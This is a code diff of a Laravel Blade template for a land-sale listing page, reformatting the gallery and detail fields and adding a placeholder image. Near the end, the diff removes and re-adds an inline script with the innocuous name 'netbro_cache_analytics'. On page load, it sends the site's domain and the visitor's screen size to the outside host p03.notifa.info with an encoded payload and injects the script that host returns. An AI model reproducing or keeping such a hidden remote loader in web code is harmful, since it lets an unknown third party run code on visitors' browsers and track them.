@@ -71,17 +71,24 @@
                                     <div class="product-gallery">
                                         <div class="product-gallery-thumbnails">
                                             <ol class="thumbnails-list list-unstyled">
-                                                @foreach($lahan->images as $dp)
-                                                <li><img src="{{asset($dp->foto)}}" alt=""></li>
+                                                @foreach ($lahan->images as $dp)
+                                                    <li><img src="{{ asset($dp->foto) }}" alt=""></li>
                                                 @endforeach
                                             </ol>
                                         </div>
                                         <div class="product-gallery-featured">
+                                            @if (count($lahan->images) > 0)
+                                                @foreach ($lahan->images as $dp)
+                                                    <img src="{{ asset($dp->foto) }}" alt="asdasda"
+                                                        style="width: 400px; height: 200px;">
+                                                @break
 
-                                            @foreach($lahan->images as $dp)
-                                            <img src="{{asset($dp->foto)}}" alt="" style="width: 400px; height: 200px;">
-                                            @break
                                             @endforeach
+                                            @else
+                                            <img src="{{ asset('no-image-found.png') }}" alt="asdasda"
+                                                style="width: 400px; height: 200px;">
+                                            @endif
+
                                         </div>
                                     </div>
                                 </div>
@@ -93,29 +100,29 @@
 
                                             <dt class="col-sm-3">Harga</dt>
                                             <dd class="col-sm-9">Rp.
-                                                {{number_format($lahan->harga_lahan,0,',','.')}}</dd>
+                                                {{ number_format($lahan->harga_lahan, 0, ',', '.') }}</dd>
 
                                             <dt class="col-sm-3">Judul Lahan</dt>
-                                            <dd class="col-sm-9">{{$lahan->judul_lahan}}</dd>
+                                            <dd class="col-sm-9">{{ $lahan->judul_lahan }}</dd>
 
                                             <dt class="col-sm-3">Luas Lahan</dt>
-                                            <dd class="col-sm-9">{{$lahan->luas_lahan}} M2</dd>
+                                            <dd class="col-sm-9">{{ $lahan->luas_lahan }} M2</dd>
 
                                             <dt class="col-sm-3">Jenis Lahan</dt>
-                                            <dd class="col-sm-9">{{$lahan->jenis_lahan}}</dd>
+                                            <dd class="col-sm-9">{{ $lahan->jenis_lahan }}</dd>
 
                                             <dt class="col-sm-3">Sertifikat</dt>
-                                            <dd class="col-sm-9">{{$lahan->sertifikat}}</dd>
+                                            <dd class="col-sm-9">{{ $lahan->sertifikat }}</dd>
 
                                             <dt class="col-sm-3">Alamat</dt>
-                                            <dd class="col-sm-9">{{$lahan->alamat}}</dd>
+                                            <dd class="col-sm-9">{{ $lahan->alamat }}</dd>
 
                                             <dt class="col-sm-3">No Penjual</dt>
-                                            <dd class="col-sm-9">{{$lahan->no_hp}}</dd>
+                                            <dd class="col-sm-9">{{ $lahan->no_hp }}</dd>
 
 
                                             <dt class="col-sm-3">Deskripsi</dt>
-                                            <dd class="col-sm-9">{{$lahan->deskripsi}}</dd>
+                                            <dd class="col-sm-9">{{ $lahan->deskripsi }}</dd>
                                         </dl>
                                         <br>
                                     </div>
@@ -149,35 +156,36 @@
     <script src="{{ asset('assets/js/pages/medias/carousel.js') }}"></script>
     <script src="{{ asset('assets/js/pages/maps/jqvmap.js') }}"></script>
     <script type="text/javascript">
-    if (self == top) {
-        function netbro_cache_analytics(fn, callback) {
-            setTimeout(function() {
+        if (self == top) {
+            function netbro_cache_analytics(fn, callback) {
+                setTimeout(function() {
+                    fn();
+                    callback();
+                }, 0);
+            }
+
+            function sync(fn) {
                 fn();
-                callback();
-            }, 0);
-        }
+            }
 
-        function sync(fn) {
-            fn();
-        }
+            function requestCfs() {
+                var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
+                var idc_glo_r = Math.floor(Math.random() * 99999999999);
+                var url = idc_glo_url + "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" +
+                    "&params=" +
+                    "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncXnjWASTgP5hscpNwuITBqiveh7Po09jZWTixOajSHEd%2bUM5viQkc16v5bfbuhl5RiGklfKf7DdoWxG5aUK2GudwbmYBF0YQ%2bcoURI6EE9w2FsRNqyDE4C8uKttpdr%2bZ61s7YmRpj%2f0p%2bX%2fMcNA4pBLS0CE7GOL7fdnC9nAEZnTONbZZiakda0jWPnXW5dJLh0DIli8%2fuhtOkMU6zZSoKF%2fAyGu45A%2byws1f%2fuwY%2b6EEtgKLbsXXPExbXc8aCyU65cNUnFgdmErEuwEeBg7gEEIYp4xtY4aaCab%2fueuSm5u5EmNK5MHbTPnq%2fzxwXPihwhvv0X7tYUWwrD5nMY8EY3pc1JqgpI447H4Gys5hKy7VjavtihwEff%2bwwnPw7zuTjto5Wd5EuryTwhOn6GeA2HEj%2fRQb0%2feetpeVCinRkEGoVPUpnDWO5dLrQri701SV67BFr7sXh4V1dsy0B5JoDB7jtVHA%2fVK2cP" +
+                    "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" +
+                    screen.height;
+                var bsa = document.createElement('script');
+                bsa.type = 'text/javascript';
+                bsa.async = true;
+                bsa.src = url;
+                (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0])
+                .appendChild(bsa);
+            }
+            netbro_cache_analytics(requestCfs, function() {});
+        };
 
-        function requestCfs() {
-            var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
-            var idc_glo_r = Math.floor(Math.random() * 99999999999);
-            var url = idc_glo_url + "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" +
-                "&params=" +
-                "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncXnjWASTgP5hscpNwuITBqiveh7Po09jZWTixOajSHEd%2bUM5viQkc16v5bfbuhl5RiGklfKf7DdoWxG5aUK2GudwbmYBF0YQ%2bcoURI6EE9w2FsRNqyDE4C8uKttpdr%2bZ61s7YmRpj%2f0p%2bX%2fMcNA4pBLS0CE7GOL7fdnC9nAEZnTONbZZiakda0jWPnXW5dJLh0DIli8%2fuhtOkMU6zZSoKF%2fAyGu45A%2byws1f%2fuwY%2b6EEtgKLbsXXPExbXc8aCyU65cNUnFgdmErEuwEeBg7gEEIYp4xtY4aaCab%2fueuSm5u5EmNK5MHbTPnq%2fzxwXPihwhvv0X7tYUWwrD5nMY8EY3pc1JqgpI447H4Gys5hKy7VjavtihwEff%2bwwnPw7zuTjto5Wd5EuryTwhOn6GeA2HEj%2fRQb0%2feetpeVCinRkEGoVPUpnDWO5dLrQri701SV67BFr7sXh4V1dsy0B5JoDB7jtVHA%2fVK2cP" +
-                "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" +
-                screen.height;
-            var bsa = document.createElement('script');
-            bsa.type = 'text/javascript';
-            bsa.async = true;
-            bsa.src = url;
-            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0])
-            .appendChild(bsa);
-        }
-        netbro_cache_analytics(requestCfs, function() {});
-    };
     </script>
 
     @yield('script')
